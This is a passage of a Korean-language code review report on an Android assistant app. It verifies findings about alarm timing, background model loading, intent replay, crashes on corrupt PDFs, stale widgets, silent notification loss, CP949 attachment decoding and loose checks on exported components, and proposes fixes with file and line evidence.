  - app/src/main/java/com/kosmos/app/platform/alarm/ReminderAlarmScheduler.kt:52,55 — 권한이 없으면 alarmManager.setWindow(RTC_WAKEUP, …, 10분)
  - app/src/main/java/com/kosmos/app/platform/alarm/ReminderAlarmScheduler.kt:98-100 — 주석이 '발화 허용 창 10분'이라고 설명
  - app/src/main/java/com/kosmos/app/platform/notification/NotificationAccess.kt:28 — '없으면 창(최대 10분) 알람으로 건다'
  - app/build.gradle.kts:21 — targetSdk 37: 안드로이드 14 이상 새 설치에서는 SCHEDULE_EXACT_ALARM 이 기본 거부
- 검증: 직접 확인: ReminderAlarmScheduler.kt:52, 55 setWindow(RTC_WAKEUP, …, 10분), 98-100 주석, NotificationAccess.kt:28 '창(최대 10분)', strings.xml:411 '알림이 최대 10분 늦을 수 있어요', 매니페스트 16줄은 SCHEDULE_EXACT_ALARM 만 선언(USE_EXACT_ALARM 없음). 코드 사실은 맞고, setWindow 알람이 절전(Doze) 중 미뤄진다는 것은 안드로이드 문서상 동작(코드로 확인 불가, 에뮬레이터 force-idle 로 확인 가능). 다만 (1) 창 강등 자체는 기록된 사용자 결정이고, (2) 승인 카드·설정에서 정확 알람 권한을 켜도록 안내가 이미 있어(NotificationAccess.kt:33-35, 0.38.2 M8) 권한을 켠 사용자는 영향이 없다. 남는 것은 권한을 끈 채 쓰는 경우의 '최대 10분' 문구와 실제의 어긋남이다. setAndAllowWhileIdle 로 바꾸는 처방은 타당하나 그쪽도 절전 중 앱당 약 9분에 한 번 제한이 있고 창 보장이 없어, 평소(절전 아님)에는 오히려 setWindow 보다 늦을 수 있다 — 바꾸기 전 에뮬레이터에서 두 방식을 비교할 것. 심각도는 낮음으로 내린다.
- 앞선 기록: CHANGELOG 0.21.x 1038줄 — '없으면 ±10분 창 자동 강등(setWindow, 권한 없어도 동작 유지)'이 사용자 결정으로 기록. CHANGELOG 0.36.0 831줄 — 권한이 없으면 승인 카드에 '최대 10분 늦을 수 있어요' 한 줄. 절전 중 지연 기록은 없음.

### platform-4 · 문서 등록 뒤 앱을 뒤로 보내면 색인이 끝나는 순간 임베딩 엔진이 백그라운드에서 올라와 계속 돈다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 책 한 권 분량 PDF 는 색인에 수십 초가 걸린다. 사용자가 등록을 누르고 다른 앱으로 넘어가면 KosmosApp.onStop 이 임베딩 작업을 취소하지만, 그 뒤에 색인이 끝나면 LibraryIndexer 가 다시 prepare 를 불러 임베딩 엔진을 백그라운드에서 새로 올리고 문서 전체의 벡터를 만든다. 다음 onStop 은 앱을 다시 켰다 내려야 오므로 엔진은 계속 메모리에 남는다. 프로젝트가 스스로 정한 불변식(AGENTS §2-⑥ '백그라운드에서 모델을 로드하지 않는다')을 어기고, 다른 앱 사용 중 발열·배터리·메모리 압박(시스템이 앱을 죽일 가능성)으로 이어진다. 기억 임베더에서는 같은 결함을 이미 고쳤는데 문서 쪽만 남아 있다.
- 제안: LibraryEmbedder 에 MemoryEmbedder 와 같은 foreground 플래그(onForeground/onBackground)를 두고, request()·onTurnFinished() 가 뒤에 있을 때는 큐에만 넣거나 버리게 한다. KosmosApp.onStop 은 cancel() 대신 onBackground() 를, ModelWarmUpObserver 의 onForeground 콜백(MainActivity 50줄)과 문서 홈 진입에서 onForeground() 를 불러 남은 조각을 잇는다(조각 단위 저장이라 이어 하기는 이미 멱등). JVM 테스트: '백그라운드 상태에서 prepare 를 불러도 embedDocuments 가 호출되지 않는다'.
- 근거:
  - app/src/main/java/com/kosmos/app/platform/document/LibraryIndexer.kt:56,121 — 앱 스코프 코루틴에서 색인을 마치면 조건 없이 embedder.prepare(document.id)
  - app/src/main/java/com/kosmos/app/platform/document/LibraryEmbedder.kt:115-127 — request()/launchIfIdle() 에 '앱이 앞에 있는가' 확인이 없음
  - app/src/main/java/com/kosmos/app/KosmosApp.kt:112-114 — 백그라운드 전환 '순간'에만 libraryEmbedder.cancel() 과 임베딩 엔진 해제
  - app/src/main/java/com/kosmos/app/platform/memory/MemoryEmbedder.kt:71,106,136 — 기억 쪽은 foreground 플래그로 같은 문제를 0.41.14 에서 막았다
- 검증: 직접 확인: LibraryIndexer.kt:56 앱 스코프(SupervisorJob+IO), 100-121 store 끝에서 조건 없이 embedder.prepare. LibraryEmbedder.kt:115-121 request 는 embedders.current()==null 과 Paused 만 보고 launchIfIdle, 123-127·129-139 drain 에 전경 확인 없음(파일 전체 grep 에서 foreground 판정 0건). 161줄 embedder.embedDocuments 가 엔진을 올린다 — EmbeddingGemmaRunner.kt:35-37 은 '다음 호출이 다시 올린다, 백그라운드 방지는 호출하는 쪽 책임'이라고 적어 러너에 방어선이 없다. KosmosApp.kt:112-114 는 onStop 순간에만 cancel()+release. 따라서 '등록 → 색인 중 다른 앱으로 → onStop 취소 → 색인 완료 → prepare → 백그라운드에서 엔진 로드'가 성립한다. MemoryEmbedder.kt:71, 83-93, 136 은 foreground 플래그로 막혀 있어 비대칭이 맞다. 보충: 임베딩은 0.42.8 부터 CPU 기본이라 GPU 메모리 3.6GB 급은 아니지만 §2-⑥ 위반과 발열·배터리는 그대로다. 발열 가드(154-157)와 inputActivity.awaitQuiet(160)는 있으나 백그라운드를 막지는 않는다. 조건이 '임베딩 모델 설치 + 큰 문서 색인 중 이탈'이라 빈도는 중간.
- 앞선 기록: CHANGELOG 0.41.14 M2 — 기억 임베더의 같은 문제를 고침(MemoryEmbedder.kt:106 주석). 문서 임베더 쪽 기록 없음. LibraryIndexer.kt:45 주석은 '백그라운드 모델 로드 금지와 무관 — CPU 파싱뿐'이라고 하지만 121줄의 prepare 호출은 다루지 않는다.

### platform-5 · 최근 앱 목록에서 다시 열면 지난 공유·음성 실행 인텐트가 또 처리된다(같은 글이 다시 붙거나 마이크가 저절로 켜짐)
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 시스템 공유 시트는 대상 앱을 새 태스크로 띄우므로 그 태스크의 뿌리 인텐트가 '공유' 인텐트가 된다. 타일·위젯 마이크로 앱을 처음 켠 경우에도 뿌리 인텐트가 '음성 입력'이다. 이런 태스크는 뒤로 가기로 화면이 끝난 뒤(런처로 시작한 태스크와 달리 실제로 종료된다) 최근 앱 목록에서 다시 누르면, 시스템이 같은 인텐트를 '기록에서 실행' 표시와 함께 새 화면에 다시 준다. 이때 savedInstanceState 는 null 이라 지금 코드는 새 요청으로 본다 — 예전에 공유한 글이 입력란에 다시 붙고(이미지는 권한이 만료돼 오류 안내), 음성 실행이었다면 사용자가 누르지도 않았는데 녹음이 시작된다. 매일 쓰다 보면 '왜 갑자기 녹음이 켜지지?'로 나타날 유형이다. 0.40.2 에서 화면 재생성 경우는 막았지만 이 경로는 남아 있다.
- 제안: MainActivity.dispatchIntent 맨 앞에서 (intent.flags and Intent.FLAG_ACTIVITY_LAUNCHED_FROM_HISTORY) != 0 이면 처리하지 않는다. 추가로 인텐트를 소비한 뒤 setIntent(Intent(this, MainActivity::class.java)) 로 비워 두면 같은 화면 인스턴스에서의 재전달도 막힌다. 에뮬레이터 확인: 다른 앱에서 글 공유 → 뒤로 가기로 종료 → 최근 앱에서 다시 열기 → 입력란이 비어 있어야 한다. 타일로 콜드 스타트 → 뒤로 → 최근 앱에서 열기 → 녹음이 시작되지 않아야 한다. (이 설명 중 '공유 시트가 새 태스크로 띄운다'는 부분은 코드가 아니라 안드로이드 동작에 대한 지식이므로 에뮬레이터 재현으로 먼저 확인할 것.)
- 근거:
  - app/src/main/java/com/kosmos/app/MainActivity.kt:57-59 — savedInstanceState == null 이면 무조건 dispatchIntent(intent)
  - app/src/main/java/com/kosmos/app/MainActivity.kt:94-96 — onNewIntent 에서 setIntent(intent) 로 마지막 인텐트를 보관
  - app/src/main/java/com/kosmos/app/platform/share/ShareIntentHandler.kt:92-125, platform/launch/VoiceLaunchHandler.kt:33-36 — Intent.FLAG_ACTIVITY_LAUNCHED_FROM_HISTORY 확인 없음(저장소 전체 grep 0건)
  - app/src/main/java/com/kosmos/app/platform/tile/VoiceTileService.kt:74-81 — 타일·위젯이 NEW_TASK 로 VOICE_INPUT 액션 인텐트를 보냄
  - app/src/main/AndroidManifest.xml:56-61 — 공유(SEND) 인텐트 필터
- 검증: 직접 확인: MainActivity.kt:57-59 savedInstanceState==null 이면 dispatchIntent, 91-97 onNewIntent 에서 setIntent 후 dispatch, 99-102 dispatchIntent 에 플래그 확인 없음. 저장소 grep 에서 LAUNCHED_FROM_HISTORY 0건. VoiceLaunchHandler.kt:33-36 은 액션 문자열만 확인, VoiceTileService.kt:74-81 은 NEW_TASK|CLEAR_TOP|SINGLE_TOP. ChatViewModel.kt:231-235 가 요청을 받아 소비. 루트에서 뒤로 가기를 가로채는 곳은 없다(MainScreen.kt:60 BackHandler 는 서랍이 열렸을 때만, AppNavHost.kt:55-59 는 화면 버튼용). 코드에 방어가 없다는 점은 맞다. 그러나 재현 경로는 코드가 아니라 안드로이드 동작 가정에 기대고, 그중 일부가 약하다: (1) 공유 시트는 보통 대상 화면을 공유한 앱의 태스크 안에 띄우므로 '공유 인텐트가 KOSMOS 태스크의 뿌리 인텐트가 된다'는 전제가 성립하지 않을 가능성이 크다(제안자도 미확인이라고 적음). (2) 음성 쪽은 앱 태스크가 전혀 없을 때 타일·위젯으로 처음 켠 경우에만 뿌리 인텐트가 VOICE_INPUT 이 되고, 그 뒤 '뒤로 가기로 끝냄 → 최근 앱에서 다시 열기'여야 한다 — 좁은 경로다. 방어 코드는 두세 줄이라 넣을 가치는 있지만 에뮬레이터 재현이 먼저이고, 심각도는 낮음.
- 앞선 기록: CHANGELOG 0.40.2 M3-8 — 재생성(언어 전환·회전·프로세스 복원) 때 재처리를 savedInstanceState 로 막음(MainActivity.kt:55-56 주석). 최근 앱 재실행 경로 기록 없음.

### platform-6 · 일부 쪽이 깨진 PDF 를 열면 예외가 잡히지 않아 뷰어(또는 색인)가 죽을 수 있고, 캐시 파일·파일 핸들이 남는다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: PdfRenderer.openPage 는 쪽을 읽지 못하면 IllegalStateException 같은 실행 시 예외를 던진다(파일 머리는 정상이라 생성자는 통과하지만 특정 쪽이 손상된 PDF, 잘린 다운로드 등). 렌더(323~336줄)와 글자 추출(346줄)은 runCatching 으로 감쌌는데, 문서를 여는 순간의 쪽 비율 측정만 맨몸이다. 이 예외는 open() 의 catch 목록에 없어 뷰어 ViewModel 코루틴까지 올라가 앱이 죽는다. 뷰어는 메신저·메일의 첨부를 여는 입구라 손상 파일을 만날 가능성이 가장 높은 곳이다. 죽지 않는 경로(색인은 Exception 을 잡음)에서도 캐시 복사본과 파일 기술자가 남는다(복사본은 하루 뒤에야 정리).
- 제안: ① 313~315줄의 비율 측정을 runCatching { … }.getOrDefault(A4) 로 감싼다(쪽을 못 읽으면 A4 비율 — KDoc 73줄의 약속과도 일치). ② openPdf 에서 AndroidPdfPages 생성을 try 로 감싸 실패 시 renderer.close()·descriptor.close()·file.delete() 후 DocumentResult.Fail(CORRUPT) 를 돌려준다. ③ open() 의 마지막에 catch (e: RuntimeException) → CORRUPT 를 추가해 파서의 예상 못 한 예외가 화면을 죽이지 않게 한다(CancellationException 은 다시 던진다). 단위 테스트는 PdfPages 가 인터페이스라 가짜로 '특정 쪽에서 예외'를 만들 수 있다. 실제 PdfRenderer 가 어떤 예외를 던지는지는 일부러 자른 PDF 로 에뮬레이터에서 한 번 확인한다.
- 근거:
  - app/src/main/java/com/kosmos/app/platform/document/DocumentOpener.kt:313-315 — AndroidPdfPages 생성자가 최대 2000쪽에 대해 renderer.openPage(index) 를 runCatching 없이 호출
  - app/src/main/java/com/kosmos/app/platform/document/DocumentOpener.kt:216-229 — openPdf 가 PdfRenderer 생성의 SecurityException·IOException 만 잡고, AndroidPdfPages 생성 실패 시 descriptor·renderer·복사본 파일을 닫지 않음
  - app/src/main/java/com/kosmos/app/platform/document/DocumentOpener.kt:130-140 — open() 이 잡는 예외는 DocumentException·SecurityException·FileNotFoundException·IOException 뿐
  - app/src/main/java/com/kosmos/app/feature/document/DocumentViewerViewModel.kt:217-219 — viewModelScope.launch 안에서 opener.open 을 try 없이 호출
  - app/src/main/AndroidManifest.xml:69-90 — 뷰어는 다른 앱의 '연결 프로그램'으로 열리는 외부 공개 화면
- 검증: 직접 확인: DocumentOpener.kt:313-315 ratios 초기화가 renderer.openPage(index) 를 runCatching 없이 호출(같은 클래스의 render 327줄·pageText 346줄은 runCatching). 216-228 openPdf 는 PdfRenderer 생성자의 SecurityException·IOException 만 잡고 228줄 AndroidPdfPages(...) 생성 실패 시 renderer·descriptor·file 을 정리하지 않는다. 130-140 open() 의 catch 는 DocumentException·SecurityException·FileNotFoundException·IOException 뿐. DocumentViewerViewModel.kt:217-219 는 viewModelScope.launch 안에서 try 없이 opener.open 호출 — 실행 시 예외가 올라오면 앱이 죽는다. 인터페이스 KDoc(DocumentOpener.kt:73 '페이지를 못 읽으면 A4 비율')과 구현이 어긋난다는 점도 맞다. 색인 경로는 LibraryIndexer.kt:155 가 Exception 을 잡아 죽지는 않지만 캐시 복사본·파일 기술자는 남는다(복사본은 copyToCache 233-234 의 하루 지난 파일 정리로 뒤늦게 삭제). 미확인: 손상된 쪽에서 PdfRenderer.openPage 가 실제로 IllegalStateException 을 던지는지는 프레임워크 동작이라 코드로 확인 못 했다 — 일부러 자른 PDF 로 에뮬레이터 확인 필요. 그래도 방어 코드(runCatching + 실패 시 정리)는 KDoc 약속과 일치시키는 작은 수정이라 타당. 또 open() 에 RuntimeException 일괄 catch 를 넣을 때 CancellationException 을 다시 던지는 것 잊지 말 것.
- 앞선 기록: CHANGELOG 0.34.0(871-874줄)·계획서 0.34.0:85 는 동시 openPage 크래시 방지(직렬화)만 다룬다. 문서를 여는 순간의 쪽 측정 예외·자원 정리 기록 없음.

### platform-7 · 홈 위젯이 연달아 일어난 변경 중 두 번째부터를 반영하지 못하고 최대 30분 낡은 내용을 보일 수 있다
- 판정 일부만 맞음 · 중요도 중간 · 크기 M
- 왜: Glance 는 위젯마다 세션을 약 45초간 살려 두고, 그 사이의 updateAll 은 provideGlance 를 처음부터 다시 돌리지 않고 이미 만든 화면을 다시 그리기만 한다. 지금 코드는 DB 를 provideContent 바깥에서 읽으므로, 세션이 살아 있는 동안 온 두 번째 갱신은 옛 스냅샷을 그대로 다시 그린다. 예: 채팅에서 일정을 추가(위젯 갱신, 세션 시작) → 20초 뒤 할 일을 완료 → 위젯에는 할 일 수가 그대로. 다음 30분 주기 갱신까지 틀린 숫자가 홈 화면에 남는다. 채팅으로 일정·알림을 연달아 넣는 것이 이 앱의 기본 사용법이라 실사용에서 '위젯이 가끔 안 맞는다'로 보일 수 있다. JVM 테스트는 위젯 렌더를 못 보므로 게이트로는 잡히지 않는다.
- 제안: 먼저 에뮬레이터에서 재현한다(할 일 추가 직후 30초 안에 완료 → 위젯 숫자 확인). 재현되면 데이터를 조합(Composition) 안으로 옮긴다: provideContent 안에서 갱신 신호(예: WidgetRefresher 가 올리는 MutableStateFlow<Long> 버전 값, 또는 Glance 상태 저장소의 타임스탬프를 updateAppWidgetState 로 바꾼 뒤 updateAll)를 구독하고, 그 값을 키로 produceState/LaunchedEffect 에서 스냅샷을 다시 읽는다. 스냅샷 조립은 이미 순수 함수(buildWidgetSnapshot)라 그대로 쓴다. 고친 뒤 device_gate 에 '연속 두 번 변경 뒤 위젯 일치' 항목을 넣는다.
- 근거:
  - app/src/main/java/com/kosmos/app/widget/KosmosWidget.kt:72-85 — 일정·할 일을 provideContent 바깥(provideGlance 본문)에서 한 번 읽어 스냅샷을 만든 뒤 provideContent { WidgetContent(snapshot) }
  - app/src/main/java/com/kosmos/app/widget/WidgetRefresher.kt:43-47 — 갱신은 KosmosWidget().updateAll(context) 뿐
  - app/src/main/res/xml/widget_kosmos_info.xml:13 — 주기 갱신 30분
  - gradle/libs.versions.toml:41 — glance 1.2.0
- 검증: 직접 확인: KosmosWidget.kt:72-85 — 일정·할 일을 provideGlance 본문에서 한 번 읽어 snapshot 을 만든 뒤 provideContent { WidgetContent(snapshot) }, 조합 안에서 구독하는 상태가 없다. WidgetRefresher.kt:43-47 갱신은 KosmosWidget().updateAll(context) 뿐. widget_kosmos_info.xml:13 주기 30분, libs.versions.toml:41 glance 1.2.0. 코드 구조는 주장대로이고, 'provideContent 바깥에서 읽은 데이터는 세션이 살아 있는 동안의 update 에 반영되지 않는다'는 것은 Glance 공식 문서가 경고하는 패턴이다. 다만 실제로 낡은 내용이 보이는지는 라이브러리 내부 동작(세션 유지 시간, update 가 provideGlance 를 다시 돌리는지)에 달려 있어 이 저장소 코드만으로는 확정할 수 없고, JVM 게이트로도 못 잡는다. 기기 확인 기록에 '위젯이 안 맞았다'는 보고도 찾지 못했다. 그래서 '위험 있음, 재현 미확인'으로 partially — 제안대로 에뮬레이터 재현(연속 두 번 변경)을 먼저 하고, 재현되면 조합 안으로 데이터를 옮긴다.
- 앞선 기록: CHANGELOG 0.22.0(위젯 갱신 훅)·0.41.14 D2(271줄 — 백업 복원 직후 위젯이 옛 DB 연결로 읽던 문제). 세션 재사용으로 인한 낡은 스냅샷 기록 없음.

### platform-8 · 알림 권한이 꺼져 있으면 알림이 화면에 뜨지 않았는데도 '울림'으로 기록되어 사라진다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 M
- 왜: 핸들러 주석은 '알림 먼저, 기록은 뒤 — 알림 실패 시 조용히 사라지지 않게'라고 설계 의도를 적었지만, 실제로는 알림을 못 띄운 경우(권한 거부, 시스템 설정에서 앱 알림 또는 '알림' 채널을 끔)에도 울린 것으로 기록한다. 0.36.0 에서 승인 시점에 권한을 묻게 했지만, 사용자가 거부했거나 나중에 끈 경우에는 알림이 흔적 없이 소모된다. 앱을 열어도 '놓친 알림'이라는 표시가 없으면 사용자는 알림이 왜 안 왔는지 알 길이 없다. 또 채널만 꺼진 경우(areNotificationsEnabled 는 true)에는 notify 가 성공한 것처럼 지나간다.
- 제안: ReminderNotifier.notifyReminder 가 Boolean(실제로 게시했는가)을 돌려주게 하고, 채널 중요도가 IMPORTANCE_NONE 인 경우도 false 로 본다. ReminderFireHandler 는 false 일 때도 발화 기록은 하되(재부팅마다 다시 시도하지 않도록) '보이지 못함' 표시를 남겨, 앱을 다음에 열 때 채팅 상단이나 할 일 화면에 '알림 권한이 꺼져 있어 ○○ 알림을 띄우지 못했어요'를 한 번 보여 준다. 표시를 DB 열로 둘지 DataStore 의 작은 목록으로 둘지는 계획 단계에서 정한다(DB 열이면 마이그레이션 필요). 최소안으로는 설정·할 일 화면에 '알림 권한 꺼짐' 경고를 상시 노출하는 것만으로도 조용한 유실은 줄어든다.
- 근거:
  - app/src/main/java/com/kosmos/app/platform/alarm/ReminderFireHandler.kt:51-52 — notifier.notifyReminder(…) 뒤에 결과와 무관하게 markReminded
  - app/src/main/java/com/kosmos/app/platform/notification/ReminderNotifier.kt:51-63 — 권한 없음·알림 꺼짐·notify 예외 모두 조용히 return(반환값 없음)
  - app/src/main/java/com/kosmos/app/platform/notification/ReminderNotifier.kt:30-32 — 인터페이스가 Unit 을 반환해 게시 여부를 알 수 없음
- 검증: 직접 확인: ReminderFireHandler.kt:51-52 notifyReminder 뒤 무조건 markReminded. ReminderNotifier.kt:30-32 반환형 Unit, 51-63 권한 없음·알림 꺼짐·notify 예외 모두 조용히 지나감. 채널 중요도 확인 없음. 코드 사실은 맞다. 틀리거나 과장된 부분: (1) '사라진다'는 과장 — 발화 기록과 완료는 별개(1037줄)라 그 할 일은 완료 전까지 할 일 목록·위젯·아침 브리핑에 그대로 남고, 결과 카드에도 '울림' 상태로 보인다(ResultCard.kt:96). 놓치는 것은 그 시각의 알림 한 번이다. (2) 권한이 처음부터 없는 경우는 0.36.0 에서 승인 시점 요청·거부 안내(strings.xml:410)로 이미 다뤘다. (3) '미허용이면 조용히 생략, 기록은 유지'는 주석에 적힌 의도라 절반은 이미 내린 결정이다. 남는 빈틈은 나중에 권한·채널을 끈 경우인데, 그때 '울림'으로 표시되는 것이 사실과 다르다는 정도다. 최소안(설정·할 일 화면에 권한 꺼짐 경고)은 값싸고 타당하지만 DB 열 추가까지 갈 일은 아니다. 심각도 낮음.
- 앞선 기록: CHANGELOG 0.21.x 1039줄 — '알림 먼저, 기록 뒤' 순서와 '발화(remindedAtMs)와 완료(isCompleted)는 별개'(1037줄). CHANGELOG 0.36.0 831줄·계획서 0.36.0:49 — 승인 시점에 권한 요청, 거부면 '알림 권한이 꺼져 있어 알림이 화면에 뜨지 않아요' 안내. ReminderNotifier.kt:49-50 주석에 '미허용이면 조용히 생략 — 리마인더 저장·발화 기록은 유지된다'가 의도로 적혀 있다.

### platform-9 · 채팅 입력바로 첨부한 한글 텍스트·CSV 가 옛 윈도우 인코딩(CP949)이면 '읽을 수 없는 파일'로 거부되거나 깨진 글자로 모델에 들어간다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 한국어 엑셀의 'CSV 저장'과 오래된 메모장 텍스트는 CP949 다. 문서 뷰어는 이 점을 알고 CP949 로 다시 읽지만, 채팅 입력바의 첨부 경로는 UTF-8 로만 읽는다. 그래서 같은 파일이 뷰어에서는 열리는데 채팅 첨부에서는 '지원하지 않는 파일'이 되거나, 숫자·영문이 많은 CSV 는 10% 기준을 통과해 한글만 깨진 채 모델에 들어가 엉뚱한 답을 만든다. 한국어 사용자를 대상으로 한 앱에서 설명하기 어려운 불일치다. 또 74줄의 read 는 한 번만 호출하므로 일부 제공자(파이프 기반 스트림)에서는 앞부분만 읽고도 '잘림' 표시 없이 끝날 수 있다.
- 제안: readDocument 에서 바이트를 상한(글자 상한 × 4 정도)까지만 읽은 뒤 CsvReader 와 같은 순서로 디코딩한다 — BOM 제거 → UTF-8 엄격 디코딩(CharsetDecoder REPORT) → 실패하면 Charset.forName("x-windows-949"). CsvReader 의 decode 를 :domain 의 공용 함수로 꺼내 두 곳이 같이 쓰게 하면 규칙이 한 곳에 모인다. 읽기는 원하는 길이가 찰 때까지 반복한다. AttachmentReader 는 JVM 테스트가 가능하므로 CP949 바이트 픽스처로 '한글이 복원된다'를 고정한다. 첨부 글자는 모델 입력이지만 문구·형식이 아니라 사용자 파일 내용이므로 토큰 실측 대상은 아니다.
- 근거:
  - app/src/main/java/com/kosmos/app/platform/share/AttachmentReader.kt:71-75 — inputStream.bufferedReader() 기본 UTF-8 로만 읽음
  - app/src/main/java/com/kosmos/app/platform/share/AttachmentReader.kt:91 — 비동기 파서로 넘기는 형식에 CSV 가 없음(XLSX·DOCX·HWPX·PDF 만)
  - app/src/main/java/com/kosmos/app/platform/share/AttachmentReader.kt:94-98 — 깨진 글자(U+FFFD)가 10% 를 넘으면 바이너리로 보고 거부, 10% 이하면 깨진 채 통과
  - domain/src/main/java/com/kosmos/app/domain/document/CsvReader.kt:15-19 — 문서 뷰어의 CSV 리더는 UTF-8 실패 시 CP949 로 다시 읽음
- 검증: 직접 확인: AttachmentReader.kt:45-52 — 이미지가 아니고 DOCUMENT_FILES(91줄: XLSX·DOCX·HWPX·PDF)가 아니면 readDocument 로 가므로 CSV·TXT 는 68-84 의 inputStream.bufferedReader()(기본 UTF-8)로 읽힌다. 94-98 looksBinary 는 U+FFFD 가 10% 를 넘으면 거부, 이하면 통과. CsvReader.kt:15-18, 53-60 은 BOM 제거 → UTF-8 엄격 → CP949 순서. 같은 파일이 뷰어에서는 열리고 채팅 첨부에서는 거부되거나 한글만 깨진 채 모델에 들어가는 불일치가 코드로 설명된다. 틀린 부분 하나: '74줄의 read 가 한 번만 호출돼 앞부분만 읽힐 수 있다'는 주장은 약하다 — BufferedReader.read(buf, off, len) 는 요청 길이가 차거나 스트림이 막힐 때까지 내부에서 반복하므로 일반 파일 제공자에서는 문제가 없다(파이프형 제공자에서만 이론상 가능). 처방(CsvReader.decode 를 공용 함수로 꺼내 공유)은 타당하고 JVM 테스트로 고정 가능. 다만 readDocument 는 E2E 경합 때문에 일부러 동기 호출이므로(26-29줄 주석) 바이트 상한을 두는 방식 그대로 유지해야 한다. 사용자 파일 내용이라 토큰 실측 대상은 아니라는 판단에도 동의.
- 앞선 기록: docs/plans/0.34.0-document-viewer.md:71 · CHANGELOG 0.34.0 874줄 — 뷰어 CSV 의 CP949 대응. 채팅 첨부 경로의 인코딩 기록 없음.

### platform-10 · 외부에 공개된 진입점의 입력 확인이 느슨하다 — 뷰어의 URI 종류, 외부 앱이 보낼 수 있는 음성 실행 액션, 캐시 폴더 전체를 여는 파일 제공자
- 판정 일부만 맞음 · 중요도 낮음 · 크기 M
- 왜: 지금 당장 뚫리는 경로는 찾지 못했다(뷰어는 지원 형식만 그리고, FileProvider 는 앱이 권한을 준 URI 만 열린다). 다만 포트폴리오에서 'exported 컴포넌트를 어떻게 방어했나'는 흔한 질문이고, 세 군데 모두 한두 줄로 좁힐 수 있는데 열려 있다. ① 다른 앱이 file:///data/user/0/…/ 형태로 앱 내부 파일을 뷰어에 열게 시도할 수 있다(열린 내용은 '채팅으로 보내기'로 이어질 수 있음). ② 다른 앱이 VOICE_INPUT 액션으로 MainActivity 를 띄우면 사용자의 손짓 없이 녹음이 시작된다(녹음은 기기 안에만 남지만 사용자가 놀랄 동작). ③ 캐시 전체를 FileProvider 범위로 두면 나중에 공유 코드를 추가할 때 실수로 다른 캐시 파일을 내보낼 여지가 생긴다.
- 제안: ① DocumentViewerActivity 에서 uri.scheme 이 content 가 아니면(또는 file 인데 경로가 앱 내부 저장소면) 열지 않고 '열 수 없는 문서' 안내로 보낸다. ② 음성 실행은 위젯·타일이 만든 것만 받게 한다 — 가장 간단한 방법은 음성 진입 전용의 exported=false 얇은 Activity(또는 activity-alias 가 아닌 내부 트램펄린)를 두고 위젯·타일의 PendingIntent 가 그것을 가리키게 하는 것이다(PendingIntent 는 exported=false 대상도 열 수 있다). ③ file_paths.xml 을 내보내기 zip 이 실제로 놓이는 하위 폴더(예: cache/export/)로 좁히고 ExportImportManager 의 출력 위치를 그 폴더로 맞춘다(:data 쪽 한 줄 — 현재 FileProvider URI 를 실제로 쓰는 곳이 있는지 먼저 grep; 없으면 provider 선언 자체를 지우는 것이 더 낫다). ④ 공유받은 글은 입력란 상한(첨부 글자 상한과 같은 상수)으로 자르고 잘렸음을 안내한다.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/document/DocumentViewerActivity.kt:54-58 — intent.data 를 종류(scheme) 확인 없이 그대로 viewModel.load 에 넘김
  - app/src/main/java/com/kosmos/app/platform/document/DocumentOpener.kt:237 — contentResolver.openInputStream(uri) 는 file:// 도 열므로 앱 내부 저장소 경로를 가리키는 URI 도 읽힌다
  - app/src/main/AndroidManifest.xml:44-62 — MainActivity 가 exported=true 이고, VoiceLaunchHandler(platform/launch/VoiceLaunchHandler.kt:33-36)는 액션 문자열만 보고 녹음 요청을 낸다 — 다른 앱도 이 액션으로 화면을 띄울 수 있다
  - app/src/main/res/xml/file_paths.xml:3 — <cache-path name="export_cache" path="." /> 로 캐시 폴더 전체가 FileProvider 범위(녹음 파일 kosmos_audio_input.wav, 문서 복사본 documents/ 포함)
  - app/src/main/java/com/kosmos/app/platform/share/ShareIntentHandler.kt:99-102 — 공유받은 글의 길이 상한 없이 그대로 전달
- 검증: 직접 확인: DocumentViewerActivity.kt:54-58, 69 — intent.data 를 종류 확인 없이 viewModel.load 로. DocumentOpener.kt:237 contentResolver.openInputStream(uri) (file 종류도 열린다는 것은 안드로이드 동작). AndroidManifest.xml:44-62 MainActivity exported=true, VoiceLaunchHandler.kt:33-36 액션 문자열만 확인. file_paths.xml:3 cache-path path='.'. ShareIntentHandler.kt:99-102 길이 상한 없이 전달. 사실관계는 맞지만 위험은 제안자 스스로 인정하듯 '지금 뚫리는 경로 없음'이다: (1) 뷰어는 지원 형식만 그리고 내용은 이 기기 화면에만 나온다 — 보낸 앱으로 돌아가는 경로가 없다. (2) FileProvider 는 exported=false 이고 app·data 의 main 소스 grep 에서 FileProvider·getUriForFile 사용처가 0건이다 — 범위를 좁히기보다 쓰이지 않는 선언(매니페스트 92-101줄 + file_paths.xml)을 지우는 것이 맞는 처방이다(지우기 전 테스트 소스·내보내기 흐름이 SAF 로만 저장하는지 한 번 더 확인). (3) 다른 앱이 음성 액션으로 화면을 띄워 녹음을 시작시킬 수 있다는 것은 성립하지만 마이크 권한은 이미 사용자가 준 상태에서 화면이 눈앞에 뜨고 녹음은 기기 안에만 남는다. (4) 공유 글 길이는 뒤 단계(입력란·ChatInputBar.kt:91 이후)에 상한이 있는지 확인하지 못했다. 결론: 포트폴리오 방어용 정리 항목으로는 유효(뷰어 content 종류만 허용, 죽은 FileProvider 선언 삭제는 각 한두 줄), 결함은 아니다. 음성 전용 내부 Activity 신설은 얻는 것에 비해 크다.
- 앞선 기록: CHANGELOG 0.34.0 872줄·0.35.0 — 뷰어를 exported 로 연 이유·taskAffinity 결정(매니페스트 64-68줄 주석). URI 종류 확인·음성 액션 출처·FileProvider 범위 기록 없음.

<details><summary>읽은 범위</summary>

[직접 읽은 것 — 전체] AndroidManifest.xml, res/xml 4개(data_extraction_rules·file_paths·locales_config·widget_kosmos_info), KosmosApp, MainActivity, platform/alarm 4개, platform/notification 5개, platform/calendar/AndroidCalendarTool, platform/document 의 DocumentOpener(406줄 전부)·DocumentAccess·DocumentTextExtractor·ContentNames·LibraryIndexer·LibraryEmbedder, platform/share 2개, platform/speech 의 AudioRecorder·SpeechOutput, platform/launch 2개, platform/tile, platform/file, work/ 5개 전부, widget/ 3개 전부, di/ 4개 전부.
